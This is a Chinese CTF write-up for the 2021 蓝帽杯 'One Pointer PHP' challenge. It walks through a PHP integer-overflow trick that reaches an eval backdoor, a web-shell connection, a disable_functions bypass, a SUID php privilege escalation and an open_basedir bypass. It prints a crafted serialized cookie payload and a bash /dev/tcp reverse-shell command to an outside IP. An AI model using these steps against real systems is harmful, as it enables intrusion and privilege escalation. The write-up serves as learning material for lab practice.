# \[蓝帽杯 2021]One Pointer PHP

## \[蓝帽杯 2021]One Pointer PHP

## 考点

* PHP整数溢出绕过数组赋值
* disable\_functions bypass
* open\_basedir bypass
* SUID提权
* PHP提权
* 攻击 php-fpm 绕过 disable\_functions

## wp

### 我的想法

给了源码，代码比较少，`user.php`定义了`User`类，有一个`count`属性

`add_api.php`先对`cookie`中的`data`进行反序列化，然后把反序列化后`User`类的`count`属性加一赋值给`count`数组，作为key，对应的value为`1`。`$count[]=1`是对数组的最后一个元素赋值，然后反序列化的`User`类的`count`属性再加一

```php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
```

举个例子，如果这里反序列化的是`O:4:"User":1:{s:5:"count";i:1;}`

那么反序列化后的user是`object(User)#1 (1) { ["count"]=> int(1) }`

然后执行数组赋值`$count[++$user->count]=1`，此时的user是`object(User)#1 (1) { ["count"]=> int(2) }`

count数组是`array(1) { [2]=> int(1) }`，意思是第3个元素值为1

然后执行`$count[]=1`，对后面一个元素赋值，count数组变成了`array(2) { [2]=> int(1) [3]=> int(1) }`，第3个和第4个元素值为1

这样就会有一个**溢出**的问题，在执行`$count[]=1`前，如果count数组的下标达到了整型最大，就会在执行这个语句时发生溢出。

回到题目，题目给的cookie如下

```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A1%3B%7D
```

32位系统int最大取值为2147483647，64位的最大取值为9223372036854775807。由于中间有一次count的自增，所以改成9223372036854775806，就可以执行shell

```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
```

![](<../../.gitbook/assets/image (26).png>)

disable\_functions过滤了很多东西，并且设置了`open_basedir`是`/var/www/html`

![](<../../.gitbook/assets/image (11).png>)

可以使用蚁剑连接shell，URL为`http://386b04f5-3788-4ff5-ae86-1d103baecdb7.node4.buuoj.cn:81/add_api.php?backdoor=eval($_POST["cmd"]);`，密码为`cmd`，再加上请求头

![](<../../.gitbook/assets/image (9).png>)

调用虚拟终端，输入ls，返回的内容是ret=127，意思是没有权限，然后就要绕过了

![](<../../.gitbook/assets/image (24).png>)

可以使用[PHP 7.0-8.0 disable\_functions bypass \[user\_filter\]](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)进行绕过，这个只能进行命令执行，没办法代码执行。然后读取flag失败，发现只有root可以读取

![](<../../.gitbook/assets/image (22).png>)

最后就是Linux提权，经典尝试suid提权。先查看具有root用户权限的SUID文件

在蚁剑的shell执行`find / -perm -u=s -type f 2>/dev/null`没有显示任何东西，再试试把[PHP 7.0-8.0 disable\_functions bypass \[user\_filter\]](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)的exp.php复制到/var/www/html下访问就可以看到结果了

![](<../../.gitbook/assets/image (34).png>)

有个/usr/local/bin/php，它是具有root权限的，并且当前用户可以使用php -a进入交互模式。但是蚁剑的shell没办法进行交互，浏览器更不行，所以考虑把shell反弹。在蚁剑执行`bash -c 'sh -i >& /dev/tcp/81.68.218.54/44444 0>&1'` 在VPS接收

![](<../../.gitbook/assets/image (29).png>)

然后进入PHP交互模式，绕过open\_basedir读取flag

![](<../../.gitbook/assets/image (19).png>)

### 攻击 php-fpm 绕过 disable\_functions（未完成）

在phpinfo可以看到是以FPM/FastCGI模式启动。
